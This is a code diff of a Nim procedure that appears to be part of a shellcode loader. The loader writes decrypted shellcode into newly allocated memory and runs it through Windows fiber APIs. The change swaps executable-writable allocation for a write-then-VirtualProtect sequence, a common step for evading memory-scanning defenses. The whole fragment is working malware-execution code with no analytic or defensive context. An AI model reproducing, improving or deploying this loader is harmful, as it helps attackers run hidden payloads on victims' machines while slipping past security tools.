@@ -23,11 +23,13 @@ dctx.clear()
 proc NimMain() {.cdecl, importc.}
 
 proc execute(): void =
+    var oldProtect: DWORD
     ConvertThreadToFiber(NULL)
-    let buffer = VirtualAlloc(NULL, cast[SIZE_T](decShellcode.len), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+    let buffer = VirtualAlloc(NULL, cast[SIZE_T](decShellcode.len), MEM_COMMIT, PAGE_READ_WRITE)
     var bytesWritten: SIZE_T
     let pHandle = GetCurrentProcess()
     WriteProcessMemory(pHandle, buffer, unsafeAddr decShellcode[0], cast[SIZE_T](decShellcode.len), addr bytesWritten)
+    VirtualProtect(buffer, cast[SIZE_T](decShellcode.len), PAGE_EXECUTE, addr oldProtect)
     let xFiber = CreateFiber(0, cast[LPFIBER_START_ROUTINE](buffer), NULL)
     SwitchToFiber(xFiber)
 
